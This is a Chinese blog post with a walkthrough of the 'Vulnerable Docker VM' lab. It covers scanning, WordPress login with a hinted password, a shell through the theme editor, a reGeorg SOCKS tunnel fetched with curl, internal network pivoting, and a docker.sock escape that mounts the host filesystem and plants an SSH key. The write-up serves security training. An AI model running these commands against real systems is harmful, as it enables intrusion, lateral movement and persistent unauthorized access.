---
id: 775
layout: post
title: 'Vulnerable Docker VM WriteUp'
date: 2017-09-27 04:46:07
author: virusdefender
tags: 安全
---

半夜发烧睡不着，看到一个有意思的类CTF的题目，就看了下。

https://www.notsosecure.com/vulnerable-docker-vm/ 可以下载一个虚拟机镜像，导入后开机会提示虚拟机的IP。先使用 nmap 扫描一下

```
Nmap scan report for 192.168.30.171
Host is up (0.00057s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

开启了 ssh，但是没有密码无法登陆，8000 端口是一个 WordPress，有一些文章和 robots.txt ，大致翻了下，没有什么有用的信息。

用 wpscan 扫了一下，发现有个注入，就是我上一篇文章提到的，并没什么用，没有安装插件，但是有一个叫 bob 的用户。

```
Identified the following 1 user/s:
+----+-------+-----------------+
| Id | Login | Name            |
+----+-------+-----------------+
| 1  | bob   | bob – NotSoEasy |
+----+-------+-----------------+
```

然后看了眼 hint，用户的密码是 `Welcome1`（其实应该用字典跑的），就这样进入了后台，在草稿箱中发现了第一个 flag。

![](https://storage.virusdefender.net/blog/images/775/1.jpg)

如果可以进入 wp 的后台，那么拿 shell 就很简单了，使用在线编辑功能就可以。

![](https://storage.virusdefender.net/blog/images/775/2.jpg)

连上 shell 后收集了下面的一些信息

 - 数据库

```
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'WordPressISBest');
define('DB_HOST', 'db:3306');
```

 - 系统是 `Linux 8f4bca8ef241 3.13.0-128-generic #177-Ubuntu SMP Tue Aug 8 11:40:23 UTC 2017 x86_64 GNU/Linux`，用户是 `www-data`，这么新的系统直接就可以放弃提权了，否则 Dirty COW 之类的洞还是超级好用的，可以参考 [Tunnel Manager - From RCE to Docker Escape](https://ricterz.me/posts/Tunnel%20Manager%20-%20From%20RCE%20to%20Docker%20Escape)

 ![](https://storage.virusdefender.net/blog/images/775/3.jpg)


 - `ip addr`

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 scope global eth0
       valid_lft forever preferred_lft forever
```

![](https://storage.virusdefender.net/blog/images/775/4.jpg)

想起题目是`Vulnerable Docker VM`，猜想应该就是 `docker.sock` 或者 HTTP API 未授权访问之类的问题，不过翻了下没找到什么。

但是看机器的 IP，感觉这个虚拟机里面应该还有个 docker network 的内网，简单的 ping 了下，发现至少是存在 `172.18.0.1-4` 的，这时候需要做一下内网穿透，这样方便在我的电脑上操作，否则 shell 里面缺少很多工具和依赖，比较麻烦。

我使用的是 [reGeorg](https://github.com/sensepost/reGeorg)

```
curl -o tunnel.php https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php
```

浏览器访问了一下，显示 `Georg says, 'All seems fine'`。

本地电脑上运行 `python reGeorgSocksProxy.py -u http://192.168.30.171:8000/tunnel.php`

```
[INFO   ]  Log Level set to [INFO]
[INFO   ]  Starting socks server [127.0.0.1:8888], tunnel at [http://192.168.30.171:8000/tunnel.php]
[INFO   ]  Checking if Georg is ready
[INFO   ]  Georg says, 'All seems fine'
```

因为 reGeorg 提供的是 socks5 代理，所以需要本地使用 proxychains，具体配置不多说了。

`proxychains mysql -u wordpress -pWordPressISBest -h 172.18.0.4` 连接数据库，但是并没有找到什么 flag，然后继续扫内网，还是 nmap 那一堆命令加上 proxychains 前缀就好。然后发现一个 IP 有个奇怪的端口

```
Nmap scan report for 172.18.0.3
Host is up (0.0062s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8022/tcp open  oa-system
```

curl 看了下，貌似是一个网页，然后在设置了浏览器的 socks5 代理，就看到了，原来是一个网页版 ssh，而且这里面终于有了 `docker.sock`。

![](https://storage.virusdefender.net/blog/images/775/7.jpg)

接下来就是老套路了，可以参考 [Docker学习与remote API未授权访问分析和利用](http://www.silence.com.cn/docker%E5%AD%A6%E4%B9%A0%E4%B8%8Eremote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8/920)

而我是直接在里面安装了一个docker，这样就可以操作主机上的 docker 了。

![](https://storage.virusdefender.net/blog/images/775/8.jpg)

然后使用 volume 挂载主机上的所有文件到一个目录

```
docker run -it --rm -v /:/vol wordpress /bin/bash
```

这样就可以看到 flag3了

![](https://storage.virusdefender.net/blog/images/775/9.jpg)

然后在 `/vol/root/.ssh` 下面又把自己的公钥写了进入，这样就可以直接 ssh 到虚拟机了。

![](https://storage.virusdefender.net/blog/images/775/10.jpg)

至于 flag2 去哪了，官方的说法是他们忘了放了，233333

